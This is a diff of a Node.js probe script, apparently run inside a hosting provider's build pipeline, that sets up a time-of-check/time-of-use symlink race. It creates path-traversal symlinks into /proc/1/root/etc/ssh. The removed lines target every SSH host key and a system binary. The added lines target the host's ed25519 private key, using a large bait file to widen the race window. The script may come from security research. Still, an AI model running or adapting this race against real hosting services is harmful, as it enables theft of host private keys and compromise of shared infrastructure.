@@ -2,47 +2,23 @@ import fs from "node:fs";
 import path from "node:path";
 import { spawn } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_READDIR_CHILD_TOCTOU_GATE:r230";
+const marker = "HOSTINGER_NODE_SINGLE_FILE_TOCTOU_GATE:r231";
 const output = path.resolve("dist");
-const slot = path.join(output, "slot-00");
-const alternateRoot = path.resolve("race-alternates");
+const alternate = path.resolve("evil-probe");
 fs.rmSync(output, { recursive: true, force: true });
-fs.rmSync(alternateRoot, { recursive: true, force: true });
-fs.mkdirSync(slot, { recursive: true });
-fs.mkdirSync(alternateRoot, { recursive: true });
-fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
+fs.rmSync(alternate, { recursive: true, force: true });
+fs.mkdirSync(output, { recursive: true });
+fs.writeFileSync(path.join(output, "bait-000.bin"), Buffer.alloc(16 * 1024 * 1024, 0x41), { mode: 0o600 });
+fs.writeFileSync(path.join(output, "probe-001"), `${marker}:safe-placeholder\n`, { mode: 0o600 });
+fs.writeFileSync(path.join(output, "zz-control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
 
-const names = [
-  "moduli",
-  "ssh_config",
-  "ssh_host_ecdsa_key",
-  "ssh_host_ecdsa_key.pub",
-  "ssh_host_ed25519_key",
-  "ssh_host_ed25519_key.pub",
-  "ssh_host_rsa_key",
-  "ssh_host_rsa_key.pub",
-  "sshd_config",
-];
-let createdLinks = 0;
-let setupError = null;
-for (const name of names) {
-  fs.writeFileSync(path.join(slot, name), `${marker}:${name}\n`, { mode: 0o600 });
-  const target = `../../../../../../../../proc/1/root/etc/ssh/${name}`;
-  try {
-    fs.symlinkSync(target, path.join(alternateRoot, name));
-    createdLinks += 1;
-  } catch (error) {
-    setupError = error.code ?? error.name;
-    break;
-  }
-}
-
-let directRead;
+const hiddenTarget = "../../../../../../../proc/1/root/etc/ssh/ssh_host_ed25519_key";
+let hiddenLink;
 try {
-  const body = fs.readFileSync("/usr/sbin/proxyexec");
-  directRead = { readable: true, bytes: body.length };
+  fs.symlinkSync(hiddenTarget, alternate);
+  hiddenLink = { created: true, isSymlink: fs.lstatSync(alternate).isSymbolicLink() };
 } catch (error) {
-  directRead = { readable: false, errorCode: error.code ?? error.name };
+  hiddenLink = { created: false, errorCode: error.code ?? error.name };
 }
 
 let exactTargetProbe;
@@ -64,9 +40,9 @@ try {
 
 console.log(JSON.stringify({
   marker,
-  directRead,
   exactTargetProbe,
-  readdirRace: { fileCount: names.length, createdLinks, setupError },
+  hiddenLink,
+  fileRace: { baitBytes: 16 * 1024 * 1024, target: "probe-001" },
   safeOutput: { isDirectory: fs.statSync(output).isDirectory(), entryCount: fs.readdirSync(output).length },
   racer,
   outputRelativeToRepository: path.relative(process.cwd(), output),
